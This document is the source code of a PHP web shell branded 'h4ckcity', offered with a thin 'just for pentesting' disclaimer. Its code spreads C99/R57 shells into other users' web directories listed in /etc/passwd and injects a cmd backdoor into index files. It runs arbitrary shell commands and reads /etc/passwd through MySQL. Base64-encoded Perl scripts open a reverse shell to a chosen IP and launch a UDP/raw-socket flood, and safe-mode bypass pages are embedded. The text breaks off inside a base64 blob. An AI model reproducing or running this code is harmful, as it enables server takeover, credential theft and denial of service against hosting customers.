<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN' 'http://www.w3.org/TR/html4/loose.dtd'>
<html>
<!--Its First Public Version 
This Tools Coded By 2MzRp & LocalMan From www.h4ckcity.org Just For Pentesting. Plz Dont Use It For Blackhat Jobs 
All This Sheller Coded By Us Except(Php DDoser , Perl Ddoser , And Php Bypassers) That U Can Find All Anywhere;)
We Expect: 1- Read Code And Fix Bug Or Add New Feature 
         : 2- Send Your New Idea To My Mail : 2MzRp2@Gmail.com
 -->
</html>
<html>
<head>
<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
<title>:: www.h4ckcity.org :: Coded By 2MzRp & LocalMan ::</title>
<style type="text/css">
a { 
text-decoration:none;
color:white;
 }
</style> 
<style>
input { 
color:#000035; 
font:8pt 'trebuchet ms',helvetica,sans-serif;
}
.DIR { 
color:#000035; 
font:bold 8pt 'trebuchet ms',helvetica,sans-serif;color:#FFFFFF;
background-color:#AA0000;
border-style:none;
}
.txt { 
color:#2A0000; 
font:bold  8pt 'trebuchet ms',helvetica,sans-serif;
} 
body, table, select, option, .info
{
font:bold  8pt 'trebuchet ms',helvetica,sans-serif;
}
body {
	background-color: #E5E5E5;
}
.style1 {color: #AA0000}
.td
{
border: 1px solid #666666;
border-top: 0px;
border-left: 0px;
border-right: 0px;
}
.tdUP
{
border: 1px solid #666666;
border-top: 1px;
border-left: 0px;
border-right: 0px;
border-bottom: 1px;
}
.style4 {color: #FFFFFF; }
</style>
</head>
<body>
<?php
# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
FUNCTION CopySheller($DIR) {
$Sheller = RndName();
$SH_TXT = (@$_POST['shellerURL']);
$file23 = (@file_get_contents("$SH_TXT"));
if (!$file23) {
echo "<font color=red>[+] Can't Open The Sheller File .</font><br>";
}
else {
$fp23 = @fopen("$DIR/$Sheller.php",'w+');
$fw23 = @fwrite($fp23,$file23);
if ($fw23) {
echo "<font color=green>[+] Uploaded Successful : $DIR/$Sheller.php</font><BR>";
}
@fclose($fp23);
 }
}
function is_windows() { return strtolower(substr(PHP_OS,0,3)) == "win"; }
$server=$HTTP_SERVER_VARS['SERVER_SOFTWARE'];
$safe_mode=ini_get('safe_mode');
$mysql_stat=function_exists('mysql_connect');
$curl_on=function_exists('curl_version');
$dis_func=ini_get('disable_functions');
function sysinfo()
{
 global $curl_on, $dis_func, $mysql_stat, $safe_mode, $server, $HTTP_SERVER_VARS;
 echo (($safe_mode)?("Safe Mode: </b><font color=green>ON</font><b> "):
         ("<B>Safe Mode: </b><font color=red>OFF</font><b> "));
 $row_dis_func=explode(', ',$dis_func);
 echo ("PHP: </b><font color=blue>".phpversion()."</font><b> ");
 echo ("MySQL: </b>");
 if($mysql_stat){
  echo "<font color=green>ON </font><b>";
 }
 else {
  echo "<font color=red>OFF </font><b>";
 }
 echo "cURL: </b>";
 if($curl_on){
  echo "<font color=green>ON</font><b><br>";
 }else
  echo "<font color=red>OFF</font><b><br>";
 if ($dis_func!=""){
  echo "Disabled Functions : </b><font color=red>".$dis_func."</font><br><b>";
 }
 else {
  echo "Disabled Functions : </b><font color=green>None</font><br><b>";
 }
 $uname = @exec('uname -a');
 echo "OS: </b><font color=blue>";
 if (empty($uname)){
  echo (php_uname()."</font><br><b>");
 }else
  echo $uname."</font><br><b>";
 $id = @exec('id');
 echo "SERVER: </b><font color=blue>".$server."</font><br><b>";
 echo "ID: </b><font color=blue>";
 if (!empty($id)){
  echo $id."</font><br><b>";
 }else
  echo "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid().
       "</font><br><b>";
 echo "<b>RemoteAddress: </b><font color=red>".$HTTP_SERVER_VARS['REMOTE_ADDR']."</font> , <b>Server: </b><font color=red>".@gethostbyname($_SERVER["HTTP_HOST"])."</font>";
 if(isset($HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'])){
  echo "<b>RemoteAddressIfProxy: </b><font color=red>".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR']."</font>";
 }
 echo "</font></font>";
}
function RndName() {
$codelenght = 10;
while(@$newcode_length < $codelenght) {
$x=1;
$y=3;
$part = rand($x,$y);
if($part==1){$a=48;$b=57;}
if($part==2){$a=65;$b=90;}
if($part==3){$a=97;$b=122;}
$code_part=chr(rand($a,$b));
(@$newcode_length = $newcode_length + 1);
(@$newcode = $newcode.$code_part);
}
return $newcode;
}
# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
echo "<CENTER>
  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse; border-style: solid; border-color: #C0C0C0; padding-left: 4; padding-right: 4; padding-top: 1; padding-bottom: 1' bordercolor='#111111' width='86%' bgcolor='#E0E0E0'>
    <tr>
      <td bgcolor='#AA0000' class='td'><div align='center' class='style4'>: Server Information : </div></td>
    </tr>
    <tr>
      <td style='padding:5px 5px 5px 5px '>";
	  echo sysinfo();
echo "	  </td>
    </tr>
    <tr>
      <td bgcolor='#AA0000' class='td' style='padding:0px 0px 0px 5px'><div align='center' class='style4'>
        <div align='left'>
          <form name='form4' method='post' action=''>
             View Directory : 
             <input name='GoDir' type='text' class='DIR' id='GoDir' size='120'>
          </form>
        </div>
      </div></td>
    </tr>
    <tr>
    <td width='100%' style='padding:5px 5px 5px 5px '>";
if (isset($_POST['Submit1']))
{
function C99_Create() {
$C99 = RndName();
$c99_add = (@$_POST['c99_txt']);
$C99_File = (@file_get_contents("$c99_add"));
if (!$C99_File){
echo "<font color=red>[+] Can't Open The C99 Sheller File .</font><br>";
}
else {
$fp1 = @fopen("$C99.php",'w+');
$fw1 = @fwrite($fp1,$C99_File);
if ($fw1) {
echo "<font color=green>[+] C99 Sheller Upload Successful : $C99.php</font><BR>";
}
else {
echo "<font color=red>[+] No Perm !</font><BR>";
}
@fclose($fp1);
}
}
function R57_Create() {
$R57 = RndName();
$r57_add = (@$_POST['r57_txt']);
$R57_File = (@file_get_contents("$r57_add"));
if (!$R57_File){
echo "<font color=red>[+] Can't Open The R57 Sheller File .</font><br>";
}
else {
$fp1 = @fopen("$R57.php",'w+');
$fw1 = @fwrite($fp1,$R57_File);
if ($fw1) {
echo "<font color=blue>[+] R57 Sheller Upload Successful : $R57.php</font><BR>";
}
else {
echo "<font color=red>[+] No Perm !</font><BR>";
}
@fclose($fp1);
}
}
for ($i=0;$i<=5;$i++) {
C99_Create();
R57_Create();
}
}

if (isset($_POST['Submit2']))
{
@mkdir("h4ckcity");
@chdir("h4ckcity");
echo '<font color=green>[+] Directory [ h4ckcity ] Created .</font><Br>';
echo '<font color=green>[+] Directory Changed .</font><Br>';
$file3 = 'Options +FollowSymLinks
DirectoryIndex seees.html
RemoveHandler .php
AddType application/octet-stream .php';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
if ($fw3) {
echo '<font color=green>[+] .htaccess File Uploaded .</font><BR>';
}
else {
echo "<font color=red>[+] No Perm To Create .htaccess File !</font><BR>";
}
@fclose($fp3);
$lines3=@file('/etc/passwd');
if (!$lines3) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines3 = $aresult;
@pclose($authp);
}
if (!$lines3) {
echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
echo "<font color=red>[+] Can't Make The Users Shortcuts .</font><BR>";
echo '<font color=red>[+] Finish !</font><BR>';
}
else {
foreach($lines3 as $line_num3=>$line3){
$sprt3=explode(":",$line3);
$user3=$sprt3[0];
@exec('ln -s /home/'.$user3.'/public_html ' . $user3);
}
echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
echo '<font color=green>[+] Finish !</font><BR>';
}
}
#######################################################################
Function START_Process() {
$lines=@file('/etc/passwd');
if (!$lines) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines = $aresult;
@pclose($authp);
}
if (!$lines) {
$EtcUrl = @$_REQUEST['ManuelDIR'];
$lines=@file("$EtcUrl");
}
if (!$lines) {
echo "<font color=red>[+] Can't Open /etc/passwd File . </font><Br>";
}
else {
$FileOpen = @fopen("DIR.txt","a");
if ($FileOpen) {
foreach($lines as $line_num=>$line){
$sprt=explode(":",$line);
$user=$sprt[0];
@fwrite($FileOpen,("home/$user/public_html\n"));
}
@fclose($FileOpen);
   $fp6 = @fopen("DIR.txt", 'r');
   if (!$fp6)
   {
     echo "<font color=red>[+] DIR.TXT Doesn't Exist, Please Try Again Later .</font><BR>";
   }
   else {
      while (!feof($fp6))
   {
      $order = fgetss($fp6,500);
   }
   rewind($fp6);
  while (!feof($fp6))
   {
      $order = fgetcsv($fp6, 500);
	  if(is_array($order))
	{
		foreach($order as $content) {
	  $dirr = '';
	  for ($i=0;$i<=11;$i++)
	  {
	  $test = @opendir("$dirr$content");
	  if (!$test){
	  $dirr = $dirr . '../';
	  }
	  }
	  if (!$test){
	  echo "<font color=red>[+] Directory Doesn't Exist .</font><BR>";
	  }
	  else {
	  @CopySheller("$dirr$content");
	  @CopySheller("$dirr$content/images");
	  @CopySheller("$dirr$content/include");
	  @CopySheller("$dirr$content/tmp");	
	  @CopySheller("$dirr$content/template");	  
	  }
	  }
	}
	}
   @fclose($fp6);
   }
}
else {
echo "<font color=red>[+] No Perm To Create DIR.TXT File, Don't Try Again There Is No Perm .</font><BR>";
}
}
}
#######################################################################
if (isset($_POST['Submit3']))
{
$SH_TXT_Check = (@$_POST['shellerURL']);
if ($SH_TXT_Check == '')
{
echo '<font color=red>[+] Plz Enter The Sheller URL .</font>';
}
else
{
@unlink('DIR.txt');
START_Process();
}
}
#######################################################################
if (isset($_POST['Submit4']))
{
$IName = (@$_POST['IndexName']);
if ($IName == '') {
echo '<font color=red>[+] Plz Insert Index Name, For Previous Directory Use ( ../ ) Symbol .</font><Br>';
}
else {
$CMD = '<?php $cmdd=(@$_REQUEST["cmd"]); echo(shell_exec($cmdd)); ?>';
$FFP = @fopen($IName,"a");
$fWrite = @fwrite($FFP, $CMD);
if ($fWrite) {
echo "<font color=green>[+] CMD Sheller Successful Inj3cted .</font><BR>";
}
else {
echo "<font color=red>[+] No Perm !</font><BR>";
}
}
}

if (isset($_POST['Submit5']))
{
$MD = (@$_POST['ManuelDIR']);
if ($MD == '') {

echo '<font color=red>[+] Plz Insert Correct Directory, For Example : home/root/public_html .</font><br>';

} else {
	  $dirr = '';
	  for ($i=0;$i<=11;$i++)
	  {
	  $test = @opendir("$dirr$MD");
	  if (!$test){
	  $dirr = $dirr . '../';
	  }
	  }
	  if (!$test){
	  echo "<font color=red>[+] Directory Doesn't Exist .</font><BR>";
	  }
	  else {
	  @CopySheller("$dirr$MD");
	  @CopySheller("$dirr$MD/images");
	  @CopySheller("$dirr$MD/include");
	  @CopySheller("$dirr$MD/admin");
	  @CopySheller("$dirr$MD/login");
	  @CopySheller("$dirr$MD/tmp");
	  @CopySheller("$dirr$MD/template");
	  }
}
}
if (isset($_POST['Submit6'])) {
$cmdCommand = @$_REQUEST['CMDTXT'];
$Item = @$_POST['CMDSelect'];
echo "<PRE>";
switch ($Item)
{
case 'system' :
if($cmdCommand != '') print system($cmdCommand);
break;
case 'exec' :
if($cmdCommand != '') print exec($cmdCommand);
break;
case 'passthru' :
if($cmdCommand != '') print passthru($cmdCommand);
break;
case 'shell_exec' :
if($cmdCommand != '') print shell_exec($cmdCommand);
break;
}
echo "</PRE>";
}
if (isset($_POST['Submit7'])) {
$lines=@file('/etc/passwd');
if (!$lines) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines = $aresult;
@pclose($authp);
}
if (!$lines) {
$EtcUrl = @$_REQUEST['ManuelDIR'];
$lines=@file("$EtcUrl");
}
if (!$lines) {
echo "<font color=red>[+] Can't Open /etc/passwd File . </font><Br>";
}
else {
foreach($lines as $line_num=>$line){
$sprt=explode(":",$line);
$user=$sprt[0];
echo "$user<BR>";
}
}
}
if (isset($_POST['Submit8'])) {
$IP = @$_REQUEST['IP_TextBox'];
$Port = @$_REQUEST['Port_TextBox'];
#===========================Create BackConnect===========================#
$fileS = base64_decode("IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRob3N0ID0gJEFSR1ZbMF07CiRw
b3J0ID0gJEFSR1ZbMV07CiAgICBpZiAoISRBUkdWWzBdKSB7CiAgcHJpbnRmICJb
IV0gVXNhZ2U6IHBlcmwgZGMucGwgPEhvc3Q+IDxQb3J0PlxuIjsKICBleGl0KDEp
Owp9CnByaW50ICJbK10gQ29ubmVjdGluZyB0byAkaG9zdFxuIjsKJHByb3QgPSBn
ZXRwcm90b2J5bmFtZSgndGNwJyk7CnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNP
Q0tfU1RSRUFNLCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0
ICEiKTsKaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBv
cnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGllKCJbLV0gVW5hYmxlIHRvIENvbm5l
Y3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwogIG9wZW4oU1RET1VU
LCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwpleGVjIHsn
L2Jpbi9zaCd9ICctYmFzaCcgLiAiXDAiIHggNDs=");
$fpS = @fopen("dc.pl",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
echo "<PRE>";
echo @shell_exec("perl dc.pl $IP $Port");
echo "</PRE>";
@unlink("dc.pl");
}
else {
Echo "<font color=red>[+] No Perm !</font><Br>";
}
@fclose($fpS);
#===========================Create BackConnect===========================#

}
if (isset($_POST['SQL_BTN'])) {
$server = @$_POST['server_txt'];
$port = @$_POST['port_txt'];
$user = @$_POST['login_txt'];
$pass = @$_POST['pass_txt'];
$db = @$_POST['db_txt'];
$tb = @$_POST['tb_txt'];
@file_get_contents('/etc/passwd');
$l = @mysql_connect("$server", "$user", "$pass") or die('<font color=red>No Connection</font>');
mysql_query("CREATE DATABASE $db");
mysql_query("CREATE TABLE $db.$tb (Valuess varchar(1024))");
mysql_query("GRANT SELECT,INSERT ON $db.$tb TO $user@$server");
mysql_close($l); mysql_connect("$server", "$user", "$pass") or die('<font color=red>No Connection</font>');
mysql_query("LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE $db.$tb");
$result = mysql_query("SELECT Valuess FROM $db.$tb");
while(list($row) = mysql_fetch_row($result))
print $row . chr(10);
echo "<PRE>";
echo $result;
echo "</PRE>";
}
if (isset($_POST['ddos_start'])) {
$fileS = base64_decode("IyEvdXNyL2Jpbi9wZXJsCiNzb2NrMSBVRFAKI3NvY2syIElHTVAKI3NvY2szIElD
TVAKI3NvY2s0IFRDUAojc29jazUgYnVneSBwYWNrZXRzCgp1c2UgU29ja2V0OwoK
JEFSR0M9QEFSR1Y7CgppZiAoJEFSR0MgIT0zKSB7CiBwcmludGYgIlxuIjsKIHBy
aW50ZiAiIC0tPT0gV2VsY29tZSB0byBJSFNURUFNIFByaXY4IFRvb2xzID09LS0g
XG5cbiI7CiBwcmludGYgIiQwIDxpcD4gPHBvcnQ+IDx0aW1lPlxuXG4iOwogcHJp
bnRmICIgRm9yIEZVQ0sgdGhlIHRhcmdldCB1c2UgVGhpcyBleGFtcGxlIDpcblxu
IjsKIHByaW50ZiAiJDAgPGlwPiAwIDBcblxuIjsKIHByaW50ZiAiJDAgPGlwPiAy
IDJcblxuIjsKIHByaW50ZiAiaWYgcG9ydCA9IDAsMiBhbmQgdGltZSA9IDAsMiB0
aGF0IG1lYW5zLCByYW5kcG9ydHMvY29udGlub3VzIHBhY2tldHMuXG5cbiI7CiBl
eGl0KDEpOwp9CgpteSAoJGlwLCRwb3J0LCRzaXplLCR0aW1lKTsKJGlwPSRBUkdW
WzBdOwokcG9ydD0kQVJHVlsxXTsKJHRpbWU9JEFSR1ZbMl07Cgpzb2NrZXQoU09D
SzEsIFBGX0lORVQsIFNPQ0tfREdSQU0sIDE3KTsKc29ja2V0KFNPQ0syLCBQRl9J
TkVULCBTT0NLX1JBVywgMik7CnNvY2tldChTT0NLMywgUEZfSU5FVCwgU09DS19S
QVcsIDEpOwpzb2NrZXQoU09DSzQsIFBGX0lORVQsIFNPQ0tfUkFXLCA2KTsKJGlh
ZGRyID0gaW5ldF9hdG9uKCIkaXAiKTsKCnByaW50ZiAiQXR0YWNrIFN0YXJ0IEZV
Q0sgdSAkaXBcbiI7CgppZiAoJEFSR1ZbMV0gPT0wICYmICRBUkdWWzJdID09MCkg
ewogICBnb3RvIHJhbmRwYWNrZXRzOwp9CgppZiAoJEFSR1ZbMV0gIT0wICYmICRB
UkdWWzJdID09MCkgewogICBnb3RvIHBhY2tldDsKfQoKaWYgKCRBUkdWWzFdID09
MiAmJiAkQVJHVlsyXSA9PTIpIHsKICAgIGdvdG8gcmFuZHBhY2tldDsKfQoKCnBh
Y2tldDoKZm9yKDs7KSB7CiAgICRzaXplPSRyYW5kIHggJHJhbmQgeCAkcmFuZDsK
ICAgc2VuZChTT0NLMSwgMCwgJHNpemUsIHNvY2thZGRyX2luKCRwb3J0LCAkaWFk
ZHIpKTsKICAgc2VuZChTT0NLMiwgMCwgJHNpemUsIHNvY2thZGRyX2luKCRwb3J0
LCAkaWFkZHIpKTsKICAgc2VuZChTT0NLMywgMCwgJHNpemUsIHNvY2thZGRyX2lu
KCRwb3J0LCAkaWFkZHIpKTsKICAgI3NlbmQoU09DSzQsIDAsICRzaXplLCBzb2Nr
YWRkcl9pbigkcG9ydCwgJGlhZGRyKSk7Cn0KCgpyYW5kcGFja2V0Ogpmb3IoOzsp
IHsKICAgJHNpemU9JHJhbmQgeCAkcmFuZCB4ICRyYW5kOwogICAkcG9ydD1pbnQo
cmFuZCA2NTAwMCkrMTsKICAgZm9yKCRpID0gMzsgJGkgPD0gMjU1OyAkaSsrKSB7
CiAgICAgICBuZXh0IGlmICRpID09IDY7CiAgICAgICBzb2NrZXQoU09DSzUsIFBG
X0lORVQsIFNPQ0tfUkFXLCAkaSkgb3IgbmV4dDsKICAgICAgIHNlbmQoU09DSzUs
IDAsICRzaXplLCBzb2NrYWRkcl9pbigkcG9ydCwgJGlhZGRyKSk7CiAgIH0KfSAK
CnJhbmRwYWNrZXRzOgpmb3IoOzspIHsKICAgJHNpemU9JHJhbmQgeCAkcmFuZCB4
ICRyYW5kOwogICAkcG9ydD1pbnQocmFuZCA2NTAwMCkgKzE7CiAgIHNlbmQoU09D
SzEsIDAsICRzaXplLCBzb2NrYWRkcl9pbigkcG9ydCwgJGlhZGRyKSk7CiAgIHNl
bmQoU09DSzIsIDAsICRzaXplLCBzb2NrYWRkcl9pbigkcG9ydCwgJGlhZGRyKSk7
CiAgIHNlbmQoU09DSzMsIDAsICRzaXplLCBzb2NrYWRkcl9pbigkcG9ydCwgJGlh
ZGRyKSk7CiAgICNzZW5kKFNPQ0s0LCAwLCAkc2l6ZSwgc29ja2FkZHJfaW4oJHBv
cnQsICRpYWRkcikpOwp9");
$fpS = @fopen("DDos.pl",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
$d_host = @$_POST['ddos_host'];
$d_port = @$_POST['ddos_port'];
$d_packet = @$_POST['ddos_packet'];
echo "<PRE>";
echo @shell_exec("perl DDos.pl $d_host $d_port $d_packet");
echo "</PRE>";
@fclose($fpS);
@unlink("DDos.pl");
}
else {
Echo "<font color=red>[+] No Perm !</font><Br>";
}
}

function CreateByPasser($ByPasserFile) {
$Version = @phpversion();
$fileS = base64_decode("$ByPasserFile");
$fpS = @fopen("$Version.php",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
echo "<font color=green>[+] ByPasser Successful Created : <a href=$Version.php>$Version.php</a></font>";
}
else {
Echo "<font color=red>[+] No Perm !</font><Br>";
}
@fclose($fpS);
}
if (isset($_POST['Submit11'])) {
$Version = @phpversion();
switch ($Version) {
case '4.4.2' or '5.1.2' :
CreateByPasser('PGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtTGFuZ3VhZ2UiIGNvbnRl
bnQ9ImVuLXVzIj4KPC9oZWFkPgo8U1RZTEU+VEQgeyBGT05ULVNJWkU6IDhwdDsg
Q09MT1I6ICNlYmViZWI7IEZPTlQtRkFNSUxZOiB2ZXJkYW5hO31CT0RZIHsgc2Ny
b2xsYmFyLWZhY2UtY29sb3I6ICM4MDAwMDA7IHNjcm9sbGJhci1zaGFkb3ctY29s
b3I6ICMxMDEwMTA7IHNjcm9sbGJhci1oaWdobGlnaHQtY29sb3I6ICMxMDEwMTA7
IHNjcm9sbGJhci0zZGxpZ2h0LWNvbG9yOiAjMTAxMDEwOyBzY3JvbGxiYXItZGFy
a3NoYWRvdy1jb2xvcjogIzEwMTAxMDsgc2Nyb2xsYmFyLXRyYWNrLWNvbG9yOiAj
MTAxMDEwOyBzY3JvbGxiYXItYXJyb3ctY29sb3I6ICMxMDEwMTA7IGZvbnQtZmFt
aWx5OiBWZXJkYW5hO31URC5oZWFkZXIgeyBGT05ULVdFSUdIVDogbm9ybWFsOyBG
T05ULVNJWkU6IDEwcHQ7IEJBQ0tHUk9VTkQ6ICM3ZDc0NzQ7IENPTE9SOiB3aGl0
ZTsgRk9OVC1GQU1JTFk6IHZlcmRhbmE7fUEgeyBGT05ULVdFSUdIVDogbm9ybWFs
OyBDT0xPUjogI2RhZGFkYTsgRk9OVC1GQU1JTFk6IHZlcmRhbmE7IFRFWFQtREVD
T1JBVElPTjogbm9uZTt9QTp1bmtub3duIHsgRk9OVC1XRUlHSFQ6IG5vcm1hbDsg
Q09MT1I6ICNmZmZmZmY7IEZPTlQtRkFNSUxZOiB2ZXJkYW5hOyBURVhULURFQ09S
QVRJT046IG5vbmU7fUEuTGlua3MgeyBDT0xPUjogI2ZmZmZmZjsgVEVYVC1ERUNP
UkFUSU9OOiBub25lO31BLkxpbmtzOnVua25vd24geyBGT05ULVdFSUdIVDogbm9y
bWFsOyBDT0xPUjogI2ZmZmZmZjsgVEVYVC1ERUNPUkFUSU9OOiBub25lO31BOmhv
dmVyIHsgQ09MT1I6ICNmZmZmZmY7IFRFWFQtREVDT1JBVElPTjogdW5kZXJsaW5l
O30uc2tpbjB7cG9zaXRpb246YWJzb2x1dGU7IHdpZHRoOjIwMHB4OyBib3JkZXI6
MnB4IHNvbGlkIGJsYWNrOyBiYWNrZ3JvdW5kLWNvbG9yOm1lbnU7IGZvbnQtZmFt
aWx5OlZlcmRhbmE7IGxpbmUtaGVpZ2h0OjIwcHg7IGN1cnNvcjpkZWZhdWx0OyB2
aXNpYmlsaXR5OmhpZGRlbjs7fS5za2luMXtjdXJzb3I6IGRlZmF1bHQ7IGZvbnQ6
IG1lbnV0ZXh0OyBwb3NpdGlvbjogYWJzb2x1dGU7IHdpZHRoOiAxNDVweDsgYmFj
a2dyb3VuZC1jb2xvcjogbWVudTsgYm9yZGVyOiAxIHNvbGlkIGJ1dHRvbmZhY2U7
dmlzaWJpbGl0eTpoaWRkZW47IGJvcmRlcjogMiBvdXRzZXQgYnV0dG9uaGlnaGxp
Z2h0OyBmb250LWZhbWlseTogVmVyZGFuYSxHZW5ldmEsIEFyaWFsOyBmb250LXNp
emU6IDEwcHg7IGNvbG9yOiBibGFjazt9Lm1lbnVpdGVtc3twYWRkaW5nLWxlZnQ6
MTVweDsgcGFkZGluZy1yaWdodDoxMHB4Ozt9aW5wdXR7YmFja2dyb3VuZC1jb2xv
cjogIzgwMDAwMDsgZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjRkZGRkZGOyBmb250
LWZhbWlseTogVGFob21hOyBib3JkZXI6IDEgc29saWQgIzY2NjY2Njt9dGV4dGFy
ZWF7YmFja2dyb3VuZC1jb2xvcjogIzgwMDAwMDsgZm9udC1zaXplOiA4cHQ7IGNv
bG9yOiAjRkZGRkZGOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDEgc29s
aWQgIzY2NjY2Njt9YnV0dG9ue2JhY2tncm91bmQtY29sb3I6ICM4MDAwMDA7IGZv
bnQtc2l6ZTogOHB0OyBjb2xvcjogI0ZGRkZGRjsgZm9udC1mYW1pbHk6IFRhaG9t
YTsgYm9yZGVyOiAxIHNvbGlkICM2NjY2NjY7fXNlbGVjdHtiYWNrZ3JvdW5kLWNv
bG9yOiAjODAwMDAwOyBmb250LXNpemU6IDhwdDsgY29sb3I6ICNGRkZGRkY7IGZv
bnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMSBzb2xpZCAjNjY2NjY2O31vcHRp
b24ge2JhY2tncm91bmQtY29sb3I6ICM4MDAwMDA7IGZvbnQtc2l6ZTogOHB0OyBj
b2xvcjogI0ZGRkZGRjsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxIHNv
bGlkICM2NjY2NjY7fWlmcmFtZSB7YmFja2dyb3VuZC1jb2xvcjogIzgwMDAwMDsg
Zm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjRkZGRkZGOyBmb250LWZhbWlseTogVGFo
b21hOyBib3JkZXI6IDEgc29saWQgIzY2NjY2Njt9cCB7TUFSR0lOLVRPUDogMHB4
OyBNQVJHSU4tQk9UVE9NOiAwcHg7IExJTkUtSEVJR0hUOiAxNTAlfWJsb2NrcXVv
dGV7IGZvbnQtc2l6ZTogOHB0OyBmb250LWZhbWlseTogQ291cmllciwgRml4ZWQs
IEFyaWFsOyBib3JkZXIgOiA4cHggc29saWQgI0E5QTlBOTsgcGFkZGluZzogMWVt
OyBtYXJnaW4tdG9wOiAxZW07IG1hcmdpbi1ib3R0b206IDVlbTsgbWFyZ2luLXJp
Z2h0OiAzZW07IG1hcmdpbi1sZWZ0OiA0ZW07IGJhY2tncm91bmQtY29sb3I6ICNC
N0IyQjA7fWJvZHksdGQsdGggeyBmb250LWZhbWlseTogdmVyZGFuYTsgY29sb3I6
ICNkOWQ5ZDk7IGZvbnQtc2l6ZTogMTFweDt9Ym9keSB7IGJhY2tncm91bmQtY29s
b3I6ICMwMDAwMDA7fTwvc3R5bGU+CjxwIGFsaWduPSJjZW50ZXIiPjxiPjxmb250
IGZhY2U9IldlYmRpbmdzIiBzaXplPSI2IiBjb2xvcj0iI0ZGMDAwMCI+ITwvZm9u
dD48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSI1IiBjb2xvcj0iI0RBREFEQSI+
PGEgaHJlZj0iPwkiPjxzcGFuIHN0eWxlPSJjb2xvcjogI0RBREFEQTsgdGV4dC1k
ZWNvcmF0aW9uOiBub25lOyBmb250LXdlaWdodDo3MDAiPjxmb250IGZhY2U9IlRp
bWVzIE5ldyBSb21hbiI+U2FmZSAKTW9kZSBTaGVsbCB2MS4wPC9mb250Pjwvc3Bh
bj48L2E+PC9mb250Pjxmb250IGZhY2U9IldlYmRpbmdzIiBzaXplPSI2IiBjb2xv
cj0iI0ZGMDAwMCI+ITwvZm9udD48L2I+PC9wPgo8Zm9ybSBtZXRob2Q9IlBPU1Qi
PgoJPHAgYWxpZ249ImNlbnRlciI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZp
bGUiIHNpemU9IjIwIj4KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJPcGVu
IiBuYW1lPSJCMSI+PC9wPgo8L2Zvcm0+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiPgoJ
CTxwIGFsaWduPSJjZW50ZXIiPjxzZWxlY3Qgc2l6ZT0iMSIgbmFtZT0iZmlsZSI+
CgkJPG9wdGlvbiB2YWx1ZT0iL2V0Yy9wYXNzd2QiPkdldCAvZXRjL3Bhc3N3ZDwv
b3B0aW9uPgoJCTxvcHRpb24gdmFsdWU9Ii92YXIvY3BhbmVsL2FjY291bnRpbmcu
bG9nIj5WaWV3IGNwYW5lbCBsb2dzPC9vcHRpb24+CgkJPG9wdGlvbiB2YWx1ZT0i
L2V0Yy9zeXNsb2cuY29uZiI+U3lzbG9nIGNvbmZpZ3VyYXRpb248L29wdGlvbj4K
CQk8b3B0aW9uIHZhbHVlPSIvZXRjL2hvc3RzIj5Ib3N0czwvb3B0aW9uPgoJCTwv
c2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIG5hbWU9IkIx
Ij48L3A+Cgk8L2Zvcm0+Cjw/cGhwCmVjaG8gIjxoZWFkPjx0aXRsZT5TYWZlIE1v
ZGUgU2hlbGw8L3RpdGxlPjwvaGVhZD4iOyAKJHR5bWN6YXM9Ii4vIjsgLy8gU2V0
ICR0eW1jemFzIHRvIGRpciB3aGVyZSB5b3UgaGF2ZSA3NzcgbGlrZSAvdmFyL3Rt
cAppZiAoQGluaV9nZXQoInNhZmVfbW9kZSIpIG9yIHN0cnRvbG93ZXIoQGluaV9n
ZXQoInNhZmVfbW9kZSIpKSA9PSAib24iKQp7CiAkc2FmZW1vZGUgPSB0cnVlOwog
JGhzYWZlbW9kZSA9ICI8Zm9udCBjb2xvcj1cInJlZFwiPk9OIChzZWN1cmUpPC9m
b250PiI7Cn0KZWxzZSB7JHNhZmVtb2RlID0gZmFsc2U7ICRoc2FmZW1vZGUgPSAi
